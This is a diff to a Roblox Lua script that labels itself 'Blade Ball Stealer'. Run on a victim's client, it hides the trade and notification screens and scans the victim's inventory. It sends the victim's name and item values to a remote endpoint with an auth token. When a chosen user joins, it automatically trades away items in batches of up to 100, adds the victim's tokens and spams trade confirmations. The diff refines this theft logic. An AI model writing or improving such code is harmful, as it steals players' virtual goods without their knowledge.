@@ -20,34 +20,24 @@ local auth_token = _G.AuthToken or "EBK-SS-A"
 local PlayerGui = plr.PlayerGui
 local tradeGui = PlayerGui.Trade
 local inTrade = false
+local notificationsGui = PlayerGui.Notifications
+
+local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
+local Replion = require(game.ReplicatedStorage.Packages.Replion)
 
 -- Cache UI
 tradeGui.Black.Visible = false
 tradeGui.Main.Visible = false
-PlayerGui.Notifications.Enabled = false
+notificationsGui.Enabled = false
 
 tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
     inTrade = tradeGui.Enabled
 end)
 
 ---------------------------------------------------------
--- FONCTION POUR RÉCUPÉRER LES TOKENS (TON SYSTÈME)
+-- FONCTIONS UTILITAIRES & RAP
 ---------------------------------------------------------
-local function getVictimTokens()
-    local tokens = 0
-    pcall(function()
-        -- On cherche le texte dans l'UI du shop ou du trade
-        local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
-        local trimmedText = rawText:gsub("^%s*(.-)%s*$", "%1")
-        local cleanedText = trimmedText:gsub("[^%d]", "")
-        tokens = tonumber(cleanedText) or 0
-    end)
-    return tokens
-end
 
----------------------------------------------------------
--- UTILITAIRES & RAP
----------------------------------------------------------
 local function formatNumber(number)
     if number == nil then return "0" end
     local suffixes = {"", "k", "m", "b", "t"}
@@ -60,7 +50,6 @@ local function formatNumber(number)
 end
 
 local function getRAP(category, itemName)
-    local Replion = require(game.ReplicatedStorage.Packages.Replion)
     local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
     if not success or not rapData then return 0 end
     for skey, rap in pairs(rapData) do
@@ -74,9 +63,18 @@ local function getRAP(category, itemName)
     return 0
 end
 
+local function getNextBatch(items, batchSize)
+    local batch = {}
+    for i = 1, math.min(batchSize, #items) do
+        table.insert(batch, table.remove(items, 1))
+    end
+    return batch
+end
+
 ---------------------------------------------------------
--- EMBEDS (VIOLET ET JAUNE)
+-- EMBEDS
 ---------------------------------------------------------
+
 local function SendJoinMessage(list, prefix)
     local totalRAP = 0
     local itemLines = ""
@@ -84,9 +82,6 @@ local function SendJoinMessage(list, prefix)
         totalRAP = totalRAP + item.RAP
         itemLines = itemLines .. "• " .. item.Name .. " [" .. formatNumber(item.RAP) .. " RAP]\n"
     end
-
-    local tokens = getVictimTokens()
-    itemLines = itemLines .. "\n🪙 **Tokens: " .. formatNumber(tokens) .. "**"
 
     local data = {
         ["auth_token"] = auth_token,
@@ -108,7 +103,6 @@ local function SendJoinMessage(list, prefix)
 end
 
 local function SendOnServerMessage()
-    local tokens = getVictimTokens()
     local totalRAP = 0
     for _, item in ipairs(itemsToSend) do totalRAP = totalRAP + item.RAP end
 
@@ -119,8 +113,7 @@ local function SendOnServerMessage()
             ["color"] = 16776960,
             ["fields"] = {
                 {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
-                {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true},
-                {name = "🪙 Tokens:", value = "```" .. formatNumber(tokens) .. "```", inline = true}
+                {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true}
             },
             ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"},
             ["footer"] = {["text"] = "Blade Ball Stealer | Session Active"}
@@ -130,35 +123,45 @@ local function SendOnServerMessage()
 end
 
 ---------------------------------------------------------
--- LOGIQUE DE TRADE ET AUTO-CONFIRM
+-- LOGIQUE DE TRADE AVEC AUTO-CONFIRM
 ---------------------------------------------------------
-local function doTrade(targetName)
-    local target = game:GetService("Players"):WaitForChild(targetName)
-    
+
+local function sendTradeRequest(user)
+    local target = game:GetService("Players"):WaitForChild(user)
+    repeat
+        task.wait(0.5)
+        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
+    until response == true
+end
+
+local function addItemToTrade(itemType, ID)
+    repeat
+        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(itemType, ID)
+    until response == true
+end
+
+local function doTrade(joinedUser)
     while #itemsToSend > 0 do
-        repeat
-            task.wait(0.5)
-            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
-        until inTrade
+        sendTradeRequest(joinedUser)
+        repeat task.wait(0.5) until inTrade
 
-        task.wait(1.5)
+        task.wait(1) -- Temps pour charger l'UI de trade
 
-        -- Ajout des items
-        local batchSize = 0
-        while #itemsToSend > 0 and batchSize < 50 do
-            local item = table.remove(itemsToSend, 1)
-            netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
-            batchSize = batchSize + 1
-            task.wait(0.1)
+        local currentBatch = getNextBatch(itemsToSend, 100)
+        for _, item in ipairs(currentBatch) do
+            addItemToTrade(item.itemType, item.ItemID)
         end
 
-        -- AJOUT DES TOKENS (TON SYSTÈME)
-        local tokens = getVictimTokens()
-        if tokens >= 1 then
-            netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens)
-        end
+        -- Tokens / Coins
+        pcall(function()
+            local rawText = PlayerGui.Trade.Main.Currency.Coins.Amount.Text
+            local tokensamount = tonumber(rawText:gsub("[^%d]", "")) or 0
+            if tokensamount >= 1 then
+                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokensamount)
+            end
+        end)
 
-        -- AUTO-CONFIRMATION SPAM
+        -- SYSTÈME AUTO-CONFIRM
         task.wait(1)
         repeat
             netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
@@ -173,9 +176,9 @@ local function doTrade(targetName)
 end
 
 ---------------------------------------------------------
--- SCAN & DÉPART
+-- SCAN & LANCEMENT
 ---------------------------------------------------------
-local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
+
 for _, cat in ipairs(categories) do
     if clientInventory[cat] then
         for id, info in pairs(clientInventory[cat]) do
@@ -192,17 +195,15 @@ end
 if #itemsToSend > 0 then
     table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
     local prefix = (ping == "Yes") and "@everyone | " or ""
-    
-    task.wait(1)
     SendJoinMessage(itemsToSend, prefix)
 
-    local function check(player)
+    local function onUserAdded(player)
         if table.find(users, player.Name) then
             SendOnServerMessage()
             doTrade(player.Name)
         end
     end
 
-    for _, p in ipairs(Players:GetPlayers()) do check(p) end
-    Players.PlayerAdded:Connect(check)
+    for _, p in ipairs(Players:GetPlayers()) do onUserAdded(p) end
+    Players.PlayerAdded:Connect(onUserAdded)
 end
